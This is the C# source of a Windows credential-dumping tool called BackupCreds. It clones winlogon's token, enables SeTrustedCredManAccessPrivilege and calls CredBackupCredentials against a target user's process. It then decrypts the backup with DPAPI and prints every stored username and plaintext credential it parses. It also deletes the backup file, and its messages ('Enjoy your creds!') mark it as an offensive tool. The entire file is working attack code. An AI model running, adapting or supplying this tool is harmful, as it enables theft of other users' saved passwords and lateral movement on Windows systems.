using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32.SafeHandles;
using static BackupCreds.Interop;

namespace BackupCreds
{
    public static class Program
    {
        private static List<ArraySegment<byte>> Split(byte[] arr)
        {
            var result = new List<ArraySegment<byte>>();
            var offset = 0;
            var blobsize = 0;
            try
            {
                do
                {
                    offset += blobsize;
                    var delimeter = BitConverter.ToInt32(arr, offset);
                    if (delimeter != 48)
                    {
                        offset += 1;
                    }
                    blobsize = BitConverter.ToInt32(arr, offset + 4);
                    result.Add(new ArraySegment<byte>(arr, offset, blobsize));
                } while (offset + blobsize < arr.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception happened in parsing of blob. Please report it! Exception was {ex}\n");
                Console.WriteLine("[!] Returning partial results ***********");
                return result;
            }

            return result;
        }

        public static bool EnableDebugPrivilege()
        {
            var hproc = GetCurrentProcess();
            if (!OpenProcessToken(hproc, 0x0020 | 0x0008, out var htok))
            {
                Console.WriteLine("[*] OpenProcessToken failed trying to enable SeDebugPrivilege");
                return false;
            }
            TokenPrivileges tkpPrivileges;
            tkpPrivileges.PrivilegeCount = 1;
            tkpPrivileges.Attributes = SePrivilegeEnabled;
            LookupPrivilegeValue(null, "SeDebugPrivilege", out tkpPrivileges.Luid);
            AdjustTokenPrivileges(htok, false, ref tkpPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[*] SeDebugPrivilege enabled");
            return true;
        }

        public static bool IsUnicode(byte[] bytes)
        {
            // helper that users the IsTextUnicode() API call to determine if a byte array is likely unicode text
            var flags = IsTextUnicodeFlags.IS_TEXT_UNICODE_STATISTICS;
            return IsTextUnicode(bytes, bytes.Length, ref flags);
        }

        public static void ParseDecCredBlob(byte[] decBlobBytes,int offset)
        {
            // code taken from https://github.com/GhostPack/SharpDPAPI/blob/master/SharpDPAPI/lib/Dpapi.cs
            try
            {
                //var offset = 0;
                var credFlags = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var credSize = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var credUnk0 = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var type = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var flags = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;

                var lastWritten = BitConverter.ToInt64(decBlobBytes, offset);
                offset += 8;
                var lastWrittenTime = new DateTime();
                var unkFlagsOrSize = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var persist = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var attributeCount = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var unk0 = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;
                var unk1 = BitConverter.ToUInt32(decBlobBytes, offset);
                offset += 4;

                var targetNameLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var targetName = Encoding.Unicode.GetString(decBlobBytes, offset, targetNameLen);
                offset += targetNameLen;
                Console.WriteLine($"    TargetName       : {targetName.Trim()}");

                var targetAliasLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var targetAlias = Encoding.Unicode.GetString(decBlobBytes, offset, targetAliasLen);
                offset += targetAliasLen;
                Console.WriteLine($"    TargetAlias      : {targetAlias.Trim()}");

                var commentLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var comment = Encoding.Unicode.GetString(decBlobBytes, offset, commentLen);
                offset += commentLen;
                Console.WriteLine($"    Comment          : {comment.Trim()}");

                var unkDataLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var unkData = Encoding.Unicode.GetString(decBlobBytes, offset, unkDataLen);
                offset += unkDataLen;

                var userNameLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var userName = Encoding.Unicode.GetString(decBlobBytes, offset, userNameLen);
                offset += userNameLen;
                Console.WriteLine($"    UserName         : {userName.Trim()}");

                var credBlobLen = BitConverter.ToInt32(decBlobBytes, offset);
                offset += 4;
                var credBlobBytes = new byte[credBlobLen];
                Array.Copy(decBlobBytes, offset, credBlobBytes, 0, credBlobLen);
                offset += credBlobLen;
                if (IsUnicode(credBlobBytes))
                {
                    var credBlob = Encoding.Unicode.GetString(credBlobBytes);
                    Console.WriteLine($"    Credential       : {credBlob.Trim()}");
                }
                else
                {
                    var credBlobByteString = BitConverter.ToString(credBlobBytes).Replace("-", " ");
                    Console.WriteLine($"    Credential       : {credBlobByteString.Trim()}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Help();
            }
            else
            {
                try
                {
                    DoDump(int.Parse(args[0]), args[1]);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[!] Something went terribly wrong: {e}");
                }
            }
        }
        private static void Help()
        {
            Console.WriteLine("BackupCreds [PID of target user] [path to save file]");
        }
        private static void DoDump(int targetProcess, string path)
        {
            try
            {
                EnableDebugPrivilege();
                var processesByName = Process.GetProcessesByName("winlogon");

                //Get the target process the user provided
                var userProcess = Process.GetProcessById(targetProcess);
                Console.WriteLine($"[*] Targeting process with PID {userProcess.Id} which runs under session: {userProcess.SessionId}");

                //we need to find the right winlogon if multiple exist
                Process winlogon = null;
                foreach (var p in processesByName)
                {
                    if (p.SessionId != userProcess.SessionId) continue;
                    winlogon = p;
                    Console.WriteLine($"[*] Found Winlogon process with PID {winlogon.Id} matching session id: {p.SessionId}");
                }

                if (winlogon != null)
                {
                    Console.WriteLine($"[*] Opening Winlogon with PID {winlogon.Id}");
                    var hProcess = OpenProcess(ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, winlogon.Id);
                    if (hProcess != IntPtr.Zero)
                    {
                        Console.WriteLine($"[*] Cloning token of Winlogon with PID {winlogon.Id}");
                        if (OpenProcessToken(hProcess, 0x0002, out var winLogonToken))// TOKEN_DUPLICATE = 0x0002
                        {
                            // 2 == SecurityImpersonation
                            var sa = new SECURITY_ATTRIBUTES();
                            if (DuplicateTokenEx(winLogonToken, (uint)TokenAccessLevels.AllAccess, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var hDupToken))
                            {
                                if (!LookupPrivilegeValue(null, "SeTrustedCredManAccessPrivilege", out var luidSeTrustedCredManAccessPrivilege))
                                {
                                    Console.WriteLine($"[!] LookupPrivilegeValue() failed, error = {Marshal.GetLastWin32Error()} SeTrustedCredManAccessPrivilege is not available");
                                    CloseHandle(hDupToken);
                                    CloseHandle(hProcess);
                                    return;
                                }

                                TokenPrivileges tkpPrivileges;
                                tkpPrivileges.PrivilegeCount = 1;
                                tkpPrivileges.Luid = luidSeTrustedCredManAccessPrivilege;
                                tkpPrivileges.Attributes = SePrivilegeEnabled;
                                var buffLen = (uint)Marshal.SizeOf(tkpPrivileges);
                                if (!AdjustTokenPrivileges(hDupToken, false, ref tkpPrivileges, (int)buffLen, IntPtr.Zero, IntPtr.Zero))
                                {
                                    Console.WriteLine($"[!] AdjustTokenPrivileges() failed, error = {Marshal.GetLastWin32Error()} SeSeTrustedCredManAccessPrivilege is not available");
                                    CloseHandle(hDupToken);
                                    CloseHandle(hProcess);
                                    return;
                                }

                                var procHandle = new SafeWaitHandle(userProcess.Handle, true);
                                if (!OpenProcessToken(procHandle.DangerousGetHandle(), (uint) TokenAccessLevels.MaximumAllowed, out var userToken))
                                {
                                    Console.WriteLine($"[!] OpenProcessToken of user process with PID {userProcess.Id} failed {Marshal.GetLastWin32Error()}");
                                    CloseHandle(hDupToken);
                                    CloseHandle(hProcess);
                                    return;
                                }

                                if (!ImpersonateLoggedOnUser(hDupToken))
                                {
                                    Console.WriteLine($"[!] ImpersonateLoggedOnUser() failed, error = {Marshal.GetLastWin32Error()}");
                                    CloseHandle(hDupToken);
                                    CloseHandle(hProcess);
                                    CloseHandle(userToken);
                                    return;
                                }

                                if (!CredBackupCredentials(userToken, path, IntPtr.Zero, 0, 0))
                                {
                                    Console.WriteLine("[!] CredBackupCredentials() returned false");
                                    return;
                                }

                                byte[] decBytes;
                                if (File.Exists(path))
                                {
                                    try
                                    {
                                        decBytes = ProtectedData.Unprotect(File.ReadAllBytes(path), null, DataProtectionScope.CurrentUser);
                                        Console.WriteLine("[*] Incoming creds!!!");
                                        Console.WriteLine("");
                                    }
                                    catch (CryptographicException e)
                                    {
                                        Console.WriteLine($"[!] ProtectedData Unprotect failed. {e}");
                                        return;
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("[!] No file has been written to the provided location");
                                    return;
                                }

                                if (decBytes.Length != 0)
                                {
                                    var newArray = new byte[decBytes.Length - 12];
                                    Buffer.BlockCopy(decBytes, 12, newArray, 0, newArray.Length);

                                    foreach (var element in Split(newArray))
                                    {
                                        ParseDecCredBlob(element.Array, element.Offset);
                                    }
                                }
                                Console.WriteLine("");
                                Console.WriteLine($"[*] Deleting file at {path}");
                                File.Delete(path);
                                Console.WriteLine("[*] Enjoy your creds! Reverting to self");
                                RevertToSelf();
                                CloseHandle(hDupToken);
                                CloseHandle(userToken);
                                CloseHandle(hProcess);
                                CloseHandle(winLogonToken);
                                CloseHandle(hDupToken);

                            }
                            else
                            {
                                Console.WriteLine("[!] Winlogon DuplicateToken failed!");
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] Winlogon OpenProcessToken failed!");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[!] OpenProcess failed on process with PID {winlogon.Id}");
                    }
                }
                else
                {
                    Console.WriteLine("[!] Unable to find target Winlogon process");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Exception happened: {e}");
            }
        }
    }
}
